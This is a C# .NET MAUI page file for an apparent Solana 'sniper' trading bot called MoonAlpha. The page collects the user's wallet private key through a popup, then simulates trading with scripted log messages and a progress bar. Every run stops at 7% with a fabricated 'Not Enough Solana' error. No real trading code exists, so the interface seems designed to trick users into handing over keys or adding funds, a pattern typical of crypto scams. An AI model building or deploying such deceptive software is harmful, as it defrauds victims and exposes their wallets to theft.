using CommunityToolkit.Maui.Views;
using Microsoft.Maui.Controls;
using System.Collections.ObjectModel;
namespace MoonAlphaMauiApps
{
    public partial class MainPage : ContentPage
    {
        
        PrivateKeyPopup privateKeyPopup;
        private ObservableCollection<string> items;

        private readonly string[] randomTexts = new[]
 {
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[INFO] Contract verified. Deploying buy order...",
    "[ERROR] Transaction failed. Error Code: 402 - Not Enough Solana.",
    "[WARNING] Insufficient balance detected. Adjusting buy parameters...",
    "[INFO] Trade skipped. Awaiting next opportunity..."
};


        public MainPage()
        {
            InitializeComponent();

            items = new ObservableCollection<string>();
            richtxtbox.ItemsSource = items;

        }
       
        private async void ShowPrivateKeyPopup()
        {
            privateKeyPopup = new PrivateKeyPopup();


            var result = (bool)await this.ShowPopupAsync(privateKeyPopup);

            sol1.IsEnabled = sol2.IsEnabled = sol5.IsEnabled = sol10.IsEnabled = result;
            if (result)
            {
                btnConnect.Text = "Connected Wallet";
                btnConnect.IsEnabled = false;

            }
        }
        private void ShowInfoPopup()
        {
            this.ShowPopup(new InfoPopup());
        }
       private void ShowCompletePopup()
        {
            this.ShowPopup(new CompletePopup());
        }

      private async void ShowFailedPopup()
        {
           
            var result = (bool)await this.ShowPopupAsync(new FailedMessage());
            if (result)
            {
                Logout();
                ClearList();
            }
        }

        private void RadioButton_Checked(object sender, CheckedChangedEventArgs e)
        {
        }

        private void OnRadioButtonCheckedChanged(object sender, CheckedChangedEventArgs e)
        {

        }

        private void OnAmountChanged(object sender, CheckedChangedEventArgs e)
        {

        }

        private void Entry_TextChanged(object sender, TextChangedEventArgs e)
        {
            if (!String.IsNullOrEmpty(txtInputLink.Text))
            {
                var startBtn = (Button)FindByName("btnStart");

                if (startBtn == null)
                {

                    return;
                }
                startBtn.IsEnabled = true;

            }


        }

        private void Button_Clicked(object sender, EventArgs e)
        {
            ShowPrivateKeyPopup();
        }

        private void Button_Click_1(object sender, EventArgs e)
        {
            ShowInfoPopup();

        }

        private void sol1_CheckedChanged(object sender, CheckedChangedEventArgs e)
        {

        }

        private void amount_CheckedChanged(object sender, CheckedChangedEventArgs e)
        {
            profitPicker.IsEnabled = true;


        }

      

        private void btnStart_Clicked(object sender, EventArgs e)
        {
            StartProgress();
        }
        private async void StartProgress()
        {
            // Reset UI instantly before starting again
            pbProgress.Progress = 0;
            prgStatusLbl.Text = "0%";

            double progress = 0;
            var startBtn = (Button)FindByName("btnStart");
            startBtn.IsEnabled = false;
            int index = 0; // Track text index

            while (progress < 1)
            {
                progress += 0.01; // Increase by 1%
                pbProgress.ProgressTo(progress, 1200, Easing.Linear);
                prgStatusLbl.Text = $"{(progress * 100):0}%";
                if (progress * 100 >= 7)
                {
                    break;
                }
                MainThread.BeginInvokeOnMainThread(async () =>
                {
                   

                    // Add new text smoothly
                    items.Add(randomTexts[index % randomTexts.Length]);

                    // Allow UI update before scrolling
                    await Task.Delay(100);

                    // Smoothly scroll to the latest item
                    if (items.Count > 0)
                    {
                        richtxtbox.ScrollTo(items[^1], ScrollToPosition.End, true);
                    }
                });

                index++; // Increment index for next text

                await Task.Delay(1200); // Wait for 1.2 seconds per step
            }

            startBtn.IsEnabled = true;
            prgStatusLbl.Text = "Failed";
           
            ShowFailedPopup();
        }


        private void profitPicker_SelectedIndexChanged(object sender, EventArgs e)
        {
            txtInputLink.IsEnabled = true;
        }

        private void Button_Clicked_1(object sender, EventArgs e)
        {
            //Logout();


        }
        private void Logout()
        {
            var flexLayoutAmount = (FlexLayout)FindByName("flexLayoutAmount");
            foreach (var child in flexLayoutAmount.Children)
            {
                if (child is RadioButton radioButton)
                {
                    radioButton.IsChecked = false;
                }
            }
            profitPicker.SelectedIndex = -1;
            txtInputLink.Text = "";
            txtInputLink.IsEnabled = false;
            prgStatusLbl.Text = "";
            profitPicker.IsEnabled = false;
            sol1.IsEnabled = sol2.IsEnabled = sol5.IsEnabled = sol10.IsEnabled = false;

            btnConnect.Text = "Connect Wallet";
            btnConnect.IsEnabled = true;
            btnStart.IsEnabled = false;
            pbProgress.Progress = 0;
            prgStatusLbl.Text = "";
       
           

        }
        private void ClearList()
        {
            MainThread.BeginInvokeOnMainThread(() =>
            {
                items.Clear(); // Clears the ListView
            });
        }
    }

}
